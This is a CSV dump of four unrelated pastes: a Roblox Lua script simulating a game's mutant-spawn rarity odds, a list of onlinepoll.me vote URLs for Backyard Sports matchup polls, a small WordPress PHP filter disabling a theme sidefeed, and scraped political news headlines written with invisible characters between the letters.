id,title,username,language,date,content
duqtVUcr,evil ass mutant logic script recreation,Clint11480,Lua,Sunday 19th of October 2025 11:41:38 PM CDT,"-- based off of NVZRR code, specifically mutant randomization
-- thanx to sickie for providing the formula and chances

local MutantTable = {
	-- T1
	{""Crawler"", 1},
	{""Puncher"", 3},
	{""Twohead"", 5},
	{""Spitter"", 8},
	-- T2
	{""Exploder"", 10},
	{""Mindflayer"", 12},
	{""Imitator"", 14},
	{""Armzooka"", 19},
	{""Plague"", 20},
	-- T3
	{""Stalker"", 50},
	{""Abominable"", 80},
	{""Freak"", 90},
	{""Demolisher"", 100},
	{""Puker"", 110},
	{""Crusher"", 120},
	{""Spewer"", 140},
	-- T4
	{""Nest"", 200},
	{""Sprayer"", 250},
	{""Juggernaut"", 400},
	-- T5 / Mold
	{""Mold"", 500},
	-- mold is 800 on maps w/o dedicated spawns

}

-- added for simplicity
local VictimAlive = true
local VictimIsPlayer = true
local VictimMaxHealth = 100
local VictimAttacking = false
local PlayerRank = 25

function CheckRoll(RollValue) -- formula as stated on the nvzrr wiki
	if VictimAlive == true then
		RollValue = RollValue * 0.75
	end

	if VictimIsPlayer == true then
		RollValue = RollValue * (1 - (PlayerRank * 0.008)) 
	end

	RollValue = RollValue * math.clamp(((1500 - VictimMaxHealth) * 0.008), 0.35, 1)

	if VictimIsPlayer == false and VictimAlive == true and VictimAttacking == false then
		RollValue = RollValue * 1.1
	end

	if VictimIsPlayer == false then
		RollValue = RollValue * 1.15
	end

	return RollValue
end

function RandomizeValues() -- ignore this i'm lazy 
	local Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimAlive = true
	else
		VictimAlive = false
	end
	Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimIsPlayer = true
	else
		VictimIsPlayer = false
	end
	Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimIsPlayer = true
	else
		VictimIsPlayer = false
	end
	Randomizer = math.random(1, 25)
	PlayerRank = Randomizer
	if VictimIsPlayer == false then
		PlayerRank = 1
	end
	Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimAttacking = true
	else
		VictimAttacking = false
	end
	Randomizer = math.random(1,1500)
	VictimMaxHealth = Randomizer
end

for count = 1, 250 do
	for i, MutantRoll in pairs(MutantTable) do
		RandomizeValues()
		local DiceRoll = CheckRoll(math.random(1, MutantRoll[2]) * MutantRoll[2])
		if DiceRoll <= MutantRoll[2] then
			print(""Spawning in "" .. MutantRoll[1] .. "" mutant of rarity "" .. MutantRoll[2])
			break
		end
	end
	task.wait()
end

-- works in roblox studio"
0pT1TCV2,csa,vuselesss,HTML,Sunday 19th of October 2025 10:51:31 PM CDT,"onlinepoll.me/en/poll/vote/who-wins-221
onlinepoll.me/en/poll/vote/who-wins-222
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-1
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-2
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-3
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-4
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-5
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-6
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-8
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-9
onlinepoll.me/en/poll/vote/backyard-baseball-who-wins-10
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-1
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-2
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-3
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-4
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-5
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-6
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-7
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-8
onlinepoll.me/en/poll/vote/backyard-soccer-who-wins-9
onlinepoll.me/en/poll/vote/backyard-football-who-wins
onlinepoll.me/en/poll/vote/backyard-football-who-wins-1
onlinepoll.me/en/poll/vote/backyard-football-who-wins-2
onlinepoll.me/en/poll/vote/backyard-football-who-wins-3
onlinepoll.me/en/poll/vote/backyard-football-who-wins-4
onlinepoll.me/en/poll/vote/backyard-football-who-wins-5
onlinepoll.me/en/poll/vote/backyard-football-who-wins-6
onlinepoll.me/en/poll/vote/backyard-football-who-wins-7
onlinepoll.me/en/poll/vote/backyard-football-who-wins-8
onlinepoll.me/en/poll/vote/backyard-football-who-wins-9
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-1
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-2
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-3
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-4
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-5
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-6
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-7
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-8
onlinepoll.me/en/poll/vote/backyard-baseball-2001-who-wins-9
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-1
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-2
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-3
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-4
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-5
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-6
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-7
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-8
onlinepoll.me/en/poll/vote/backyard-soccer-mls-edition-who-wins-9
onlinepoll.me/poll/vote/backyard-football-2002-who-wins
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-1
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-2
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-3
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-4
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-5
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-6
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-7
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-8
onlinepoll.me/poll/vote/backyard-football-2002-who-wins-9
onlinepoll.me/poll/vote/backyard-basketball-who-wins
onlinepoll.me/poll/vote/backyard-basketball-who-wins-1
onlinepoll.me/poll/vote/backyard-basketball-who-wins-2
onlinepoll.me/poll/vote/backyard-basketball-who-wins-3
onlinepoll.me/poll/vote/backyard-basketball-who-wins-4
onlinepoll.me/poll/vote/backyard-basketball-who-wins-5
onlinepoll.me/poll/vote/backyard-basketball-who-wins-6
onlinepoll.me/poll/vote/backyard-basketball-who-wins-7
onlinepoll.me/poll/vote/backyard-basketball-who-wins-8
onlinepoll.me/poll/vote/backyard-basketball-who-wins-9
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-1
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-2
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-3
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-4
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-5
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-6
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-7
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-8
onlinepoll.me/en/poll/vote/backyard-baseball-2003-who-wins-9
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-1
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-2
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-3
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-4
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-5
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-6
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-7
onlinepoll.me/poll/vote/backyard-soccer-2004-who-wins-8
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-1
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-2
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-3
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-4
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-5
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-6
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-7
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-8
onlinepoll.me/en/poll/vote/backyard-hockey-who-wins-9
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-1
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-2
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-3
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-4
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-5
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-6
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-7
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-8
onlinepoll.me/poll/vote/backyard-basketball-2004-who-wins-9
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-1
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-2
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-3
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-4
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-5
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-6
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-7
onlinepoll.me/poll/vote/backyard-football-2004-who-wins-8
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-1
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-2
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-3
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-4
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-5
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-6
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-7
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-8
onlinepoll.me/poll/vote/backyard-baseball-2005-who-wins-9
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-1
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-2
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-3
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-4
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-5
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-6
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-7
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-8
onlinepoll.me/poll/vote/backyard-hockey-2005-who-wins-9
onlinepoll.me/poll/vote/backyard-football-2006-who-wins
onlinepoll.me/poll/vote/backyard-football-2006-who-wins-1
onlinepoll.me/poll/vote/backyard-football-2006-who-wins-2
onlinepoll.me/poll/vote/backyard-football-2006-who-wins-3
onlinepoll.me/poll/vote/backyard-football-2006-who-wins-4
onlinepoll.me/poll/vote/backyard-football-2006-who-wins-5
onlinepoll.me/poll/vote/backyard-football-2006-who-wins-6"
FeF0URMp,disable sidefeed on elementor fullwidth page template,arie_cristianD,PHP,Sunday 19th of October 2025 08:30:16 PM CDT,"add_filter(
	'theme_mod_jnews_sidefeed_enable',
	function ( $enable ) {
		$page_template = get_page_template_slug();
		if ( 'elementor_header_footer' === $page_template ) {
			return false;
		}
		return $enable;
	}
);

"
tFkV2dD5,News Oct19 25,Newscaster0,Email,Sunday 19th of October 2025 07:00:16 PM CDT,".‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

U‎g‎h‎.‎.‎.‎ ‎I‎ ‎h‎a‎t‎e‎ ‎m‎y‎ ‎l‎i‎f‎e‎.‎

W‎A‎T‎C‎H‎:‎ ‎L‎i‎t‎h‎i‎u‎m‎ ‎B‎a‎t‎t‎e‎r‎y‎ ‎F‎i‎r‎e‎ ‎E‎r‎u‎p‎t‎s‎ ‎o‎n‎ ‎A‎i‎r‎ ‎C‎h‎i‎n‎a‎ ‎F‎l‎i‎g‎h‎t‎ ‎C‎a‎r‎r‎y‎i‎n‎g‎ ‎1‎6‎0‎
‘‎W‎a‎k‎e‎ ‎U‎p‎,‎ ‎N‎Y‎C‎’‎:‎ ‎M‎a‎m‎d‎a‎n‎i‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎I‎m‎a‎m‎ ‎T‎i‎e‎d‎ ‎t‎o‎ ‎W‎T‎C‎ ‎B‎o‎m‎b‎i‎n‎g‎
D‎o‎u‎g‎ ‎M‎a‎r‎t‎i‎n‎,‎ ‎F‎o‎r‎m‎e‎r‎ ‎B‎u‎c‎c‎a‎n‎e‎e‎r‎s‎ ‎R‎u‎n‎n‎i‎n‎g‎ ‎B‎a‎c‎k‎,‎ ‎D‎e‎a‎d‎ ‎a‎t‎ ‎3‎6‎
R‎e‎m‎o‎v‎i‎n‎g‎ ‎C‎o‎p‎s‎ ‎f‎r‎o‎m‎ ‎T‎r‎a‎f‎f‎i‎c‎ ‎E‎n‎f‎o‎r‎c‎e‎m‎e‎n‎t‎ ‎S‎t‎i‎l‎l‎ ‎o‎n‎ ‎t‎h‎e‎ ‎T‎a‎b‎l‎e‎ ‎i‎n‎ ‎L‎o‎s‎ ‎A‎n‎g‎e‎l‎e‎s‎
D‎o‎l‎p‎h‎i‎n‎s‎ ‎B‎e‎n‎c‎h‎ ‎T‎u‎a‎ ‎T‎a‎g‎o‎v‎a‎i‎l‎o‎a‎ ‎A‎f‎t‎e‎r‎ ‎D‎i‎s‎a‎s‎t‎r‎o‎u‎s‎ ‎3‎-‎I‎N‎T‎ ‎P‎e‎r‎f‎o‎r‎m‎a‎n‎c‎e‎
S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎F‎i‎n‎d‎s‎ ‎H‎u‎n‎t‎i‎n‎g‎ ‎S‎t‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎V‎i‎e‎w‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎ ‎a‎t‎ ‎P‎a‎l‎m‎ ‎B‎e‎a‎c‎h‎ ‎A‎i‎r‎p‎o‎r‎t‎
S‎a‎n‎ ‎A‎n‎t‎o‎n‎i‎o‎ ‎C‎h‎u‎r‎c‎h‎,‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎h‎o‎o‎d‎s‎ ‎T‎a‎g‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎
P‎o‎l‎i‎c‎e‎:‎ ‎'‎S‎p‎e‎c‎i‎f‎i‎c‎'‎ ‎T‎i‎p‎ ‎L‎e‎a‎d‎s‎ ‎t‎o‎ ‎R‎e‎m‎a‎i‎n‎s‎ ‎B‎e‎l‎i‎e‎v‎e‎d‎ ‎t‎o‎ ‎B‎e‎ ‎M‎i‎s‎s‎i‎n‎g‎ ‎P‎h‎i‎l‎l‎y‎ ‎W‎o‎m‎a‎n‎
C‎a‎r‎t‎e‎l‎ ‎G‎u‎n‎m‎e‎n‎ ‎A‎m‎b‎u‎s‎h‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎B‎o‎r‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎C‎o‎p‎s‎ ‎n‎e‎a‎r‎ ‎T‎e‎x‎a‎s‎
'‎N‎o‎ ‎M‎o‎r‎e‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎r‎a‎w‎s‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎t‎o‎n‎i‎a‎n‎s‎ ‎f‎o‎r‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎M‎a‎r‎c‎h‎
F‎l‎o‎r‎i‎d‎a‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎F‎o‎r‎c‎e‎d‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎P‎o‎s‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎C‎l‎a‎s‎s‎r‎o‎o‎m‎
D‎e‎ ‎N‎i‎r‎o‎:‎ ‎'‎G‎o‎d‎ ‎B‎l‎e‎s‎s‎'‎ ‎L‎e‎t‎i‎t‎i‎a‎ ‎J‎a‎m‎e‎s‎ ‎f‎o‎r‎ ‎S‎a‎y‎i‎n‎g‎ ‎'‎F‎*‎c‎k‎ ‎Y‎o‎u‎'‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎:‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎M‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎a‎ ‎'‎N‎a‎z‎i‎,‎'‎ ‎H‎e‎'‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎'‎G‎o‎e‎b‎b‎e‎l‎s‎'‎
S‎p‎e‎a‎k‎e‎r‎ ‎J‎o‎h‎n‎s‎o‎n‎:‎ ‎'‎T‎h‎e‎r‎e‎’‎s‎ ‎a‎ ‎R‎i‎s‎e‎ ‎o‎f‎ ‎M‎a‎r‎x‎i‎s‎m‎ ‎i‎n‎ ‎t‎h‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎i‎c‎ ‎P‎a‎r‎t‎y‎'‎
C‎h‎r‎i‎s‎ ‎M‎e‎l‎o‎n‎i‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎I‎s‎ ‎a‎ ‎C‎l‎e‎a‎r‎ ‎a‎n‎d‎ ‎P‎r‎e‎s‎e‎n‎t‎ ‎D‎a‎n‎g‎e‎r‎ ‎t‎o‎ ‎A‎m‎e‎r‎i‎c‎a‎'‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎F‎i‎n‎d‎s‎ ‎H‎u‎n‎t‎i‎n‎g‎ ‎S‎t‎a‎n‎d‎ ‎O‎v‎e‎r‎l‎o‎o‎k‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎ ‎O‎n‎e‎ ‎E‎x‎i‎t‎
T‎i‎t‎l‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎m‎a‎g‎e‎ ‎I‎D‎:‎ ‎2‎5‎0‎8‎7‎7‎7‎4‎2‎4‎4‎3‎6‎7‎ ‎A‎r‎t‎i‎c‎l‎e‎:‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎r‎r‎i‎v‎e‎s‎ ‎o‎n‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎
F‎B‎I‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎ ‎K‎a‎s‎h‎ ‎P‎a‎t‎e‎l‎ ‎c‎o‎n‎f‎i‎r‎m‎e‎d‎ ‎S‎u‎n‎d‎a‎y‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎S‎e‎c‎r‎e‎t‎ ‎S‎e‎r‎v‎i‎c‎e‎ ‎d‎i‎s‎c‎o‎v‎e‎r‎e‎d‎ ‎a‎ ‎h‎u‎n‎t‎i‎n‎g‎ ‎s‎t‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎a‎ ‎v‎i‎e‎w‎ ‎o‎f‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎s‎ ‎h‎e‎ ‎d‎i‎s‎e‎m‎b‎a‎r‎k‎s‎ ‎A‎i‎r‎ ‎F‎o‎r‎c‎e‎ ‎O‎n‎e‎ ‎a‎t‎ ‎P‎a‎l‎m‎ ‎B‎e‎a‎c‎h‎ ‎I‎n‎t‎e‎r‎n‎a‎t‎i‎o‎n‎a‎l‎ ‎A‎i‎r‎p‎o‎r‎t‎ ‎i‎n‎ ‎F‎l‎o‎r‎i‎d‎a‎.‎

‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎r‎a‎w‎s‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎t‎o‎n‎i‎a‎n‎s‎ ‎f‎o‎r‎ ‎P‎e‎a‎c‎e‎f‎u‎l‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎D‎e‎m‎o‎n‎s‎t‎r‎a‎t‎i‎o‎n‎
'‎N‎o‎ ‎M‎o‎r‎e‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎r‎a‎w‎s‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎H‎o‎u‎s‎t‎o‎n‎i‎a‎n‎s‎ ‎f‎o‎r‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎M‎a‎r‎c‎h‎
8‎5‎
C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎D‎o‎n‎’‎t‎ ‎R‎e‎s‎p‎e‎c‎t‎ ‎T‎h‎i‎s‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎—‎ ‎T‎h‎e‎y‎ ‎D‎o‎n‎’‎t‎ ‎C‎a‎r‎e‎ ‎A‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎C‎o‎n‎s‎t‎i‎t‎u‎t‎i‎o‎n‎
C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎D‎o‎n‎'‎t‎ ‎R‎e‎s‎p‎e‎c‎t‎ ‎t‎h‎i‎s‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎,‎ ‎D‎o‎n‎'‎t‎ ‎C‎a‎r‎e‎ ‎A‎b‎o‎u‎t‎ ‎C‎o‎n‎s‎t‎i‎t‎u‎t‎i‎o‎n‎
4‎,‎4‎6‎6‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎:‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎M‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎a‎ ‎‘‎N‎a‎z‎i‎,‎’‎ ‎H‎e‎’‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎‘‎G‎o‎e‎b‎b‎e‎l‎s‎’‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎:‎ ‎S‎t‎e‎p‎h‎e‎n‎ ‎M‎i‎l‎l‎e‎r‎ ‎I‎s‎ ‎a‎ ‎'‎N‎a‎z‎i‎,‎'‎ ‎H‎e‎'‎s‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎'‎G‎o‎e‎b‎b‎e‎l‎s‎'‎
9‎2‎2‎
‘‎I‎’‎m‎ ‎B‎e‎i‎n‎g‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎’‎:‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎F‎o‎r‎c‎e‎d‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎P‎o‎s‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎C‎
F‎l‎o‎r‎i‎d‎a‎ ‎T‎e‎a‎c‎h‎e‎r‎ ‎F‎o‎r‎c‎e‎d‎ ‎t‎o‎ ‎R‎e‎m‎o‎v‎e‎ ‎C‎h‎a‎r‎l‎i‎e‎ ‎K‎i‎r‎k‎ ‎P‎o‎s‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎C‎l‎a‎s‎s‎r‎o‎o‎m‎
2‎0‎5‎
J‎e‎w‎i‎s‎h‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎‘‎A‎n‎t‎a‎g‎o‎n‎i‎s‎i‎n‎g‎’‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎b‎y‎ ‎W‎e‎a‎r‎i‎n‎g‎ ‎S‎t‎a‎r‎ ‎o‎f‎ ‎D‎a‎v‎i‎
J‎e‎w‎i‎s‎h‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎W‎h‎i‎l‎e‎ ‎W‎e‎a‎r‎i‎n‎g‎ ‎S‎t‎a‎r‎ ‎o‎f‎ ‎D‎a‎v‎i‎d‎ ‎a‎t‎ ‎P‎r‎o‎-‎P‎a‎l‎e‎s‎t‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎
7‎2‎5‎
W‎a‎t‎c‎h‎:‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎o‎l‎l‎s‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎w‎i‎t‎h‎ ‎‘‎T‎o‎p‎ ‎G‎u‎n‎’‎ ‎S‎t‎y‎l‎e‎ ‎M‎e‎m‎e‎
W‎a‎t‎c‎h‎:‎ ‎T‎r‎u‎m‎p‎ ‎T‎r‎o‎l‎l‎s‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎w‎i‎t‎h‎ ‎‘‎T‎o‎p‎ ‎G‎u‎n‎’‎ ‎S‎t‎y‎l‎e‎ ‎M‎e‎m‎e‎
7‎,‎2‎6‎5‎
J‎o‎h‎n‎ ‎C‎u‎s‎a‎c‎k‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎a‎n‎ ‎A‎u‎t‎h‎o‎r‎i‎t‎a‎r‎i‎a‎n‎,‎ ‎H‎i‎s‎ ‎‘‎M‎a‎s‎k‎e‎d‎ ‎G‎o‎o‎n‎s‎’‎ ‎A‎r‎e‎ ‎‘‎A‎b‎d‎u‎c‎t‎i‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎&‎
C‎u‎s‎a‎c‎k‎:‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎a‎n‎ ‎A‎u‎t‎h‎o‎r‎i‎t‎a‎r‎i‎a‎n‎,‎ ‎H‎i‎s‎ ‎M‎a‎s‎k‎e‎d‎ ‎G‎o‎o‎n‎s‎ ‎A‎r‎e‎ ‎A‎b‎d‎u‎c‎t‎i‎n‎g‎ ‎P‎e‎o‎p‎l‎e‎
3‎,‎1‎5‎0‎
‘‎W‎a‎k‎e‎ ‎U‎p‎,‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎’‎:‎ ‎M‎a‎m‎d‎a‎n‎i‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎I‎m‎a‎m‎ ‎T‎i‎e‎d‎ ‎t‎o‎ ‎’‎9‎3‎ ‎W‎T‎C‎ ‎B‎o‎m‎b‎i‎n‎g‎ ‎—‎ ‎L‎a‎w‎
‘‎W‎a‎k‎e‎ ‎U‎p‎,‎ ‎N‎Y‎C‎’‎:‎ ‎M‎a‎m‎d‎a‎n‎i‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎I‎m‎a‎m‎ ‎T‎i‎e‎d‎ ‎t‎o‎ ‎W‎T‎C‎ ‎B‎o‎m‎b‎i‎n‎g‎
3‎6‎
